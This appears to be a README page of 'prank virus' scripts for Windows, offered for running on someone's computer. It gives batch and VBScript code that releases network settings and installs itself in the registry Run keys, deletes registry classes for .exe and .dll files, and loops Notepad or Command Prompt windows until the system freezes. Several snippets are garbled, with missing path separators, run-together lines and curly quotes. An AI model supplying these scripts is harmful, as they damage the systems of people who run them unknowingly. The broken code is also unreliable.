# Notepad Virus

## 🦠Top Prank Virus Making Commands From Notepad🦠


### 🟣1. Disable Internet Permanently :-
```bash  
echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
PAUSE
```
### 🃏Action :-  This will disable the internet connectivity permanently.



### 🟣2.  Delete Key Registry Files :-

```bash
@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your PC has been crashed.Your Dad.
GOTO MESSAGE
```
### 🃏Action :- This will delete key registry files, then loops a message

## 🟣3.Endless Notepads :-
```bash 
@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
```
### 🃏Action :- This will pop up endless notepads until the computer freezes and crashes


### 🟣4. Popping Cd Drive :- 
```bash
Set oWMP = CreateObject(”WMPlayer.OCX.7″)
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count – 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count – 1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep 100
loop
```

### 🃏Action :- This will make the CD drives constantly pop out


## 🟣 5. Endless Enter :-

```bash 
Set wshShell = wscript.CreateObject(”WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “~(enter)”
loop
```
### 🟣1. Cmd tab spam  :-
```
:loopstart
start
goto loopstart
```
### 🃏Action :- This opens Command Prompt tabs in a loop, freezing the system until manually shut down..
